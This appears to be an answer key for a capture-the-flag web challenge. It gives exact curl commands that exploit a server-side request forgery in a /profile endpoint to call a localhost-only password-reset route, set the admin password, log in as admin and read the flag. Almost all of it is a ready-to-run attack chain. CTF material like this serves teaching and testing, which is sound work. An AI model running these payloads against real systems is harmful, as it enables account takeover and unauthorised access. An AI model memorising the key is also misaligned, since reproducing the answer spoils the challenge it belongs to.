# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: SSRF used to defeat an IP-based access control. `/reset_password`
only allows callers whose source IP is `127.0.0.1`. The `/profile` POST has an
SSRF: it server-side fetches any `profile_picture_url` via `urlretrieve`. Point
that at the loopback reset endpoint to reset the admin password, then log in as
admin to read the flag.

1. **Register and log in** as a throwaway user (keep one cookie jar):

   ```
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/register \
     -d "username=attacker&password=pass123&first_name=A&last_name=B&email=a@b.com"
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/login -d "username=attacker&password=pass123"
   ```

2. **SSRF the server into calling its own localhost-only reset endpoint**
   (URL-encode the `?`/`&` so they ride inside the SSRF URL):

   ```
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/profile \
     -d "first_name=A&last_name=B&email=a@b.com&profile_picture_url=http://127.0.0.1:80/reset_password%3Fusername=admin%26newpassword=hacked123"
   ```

3. **Log in as admin** with the password you just set:

   ```
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/login -d "username=admin&password=hacked123"
   ```

4. **Read the admin profile** and extract the flag (`FLAG{...}`); report it
   verbatim:

   ```
   curl -s -c cookies.txt -b cookies.txt http://<target>/profile
   ```
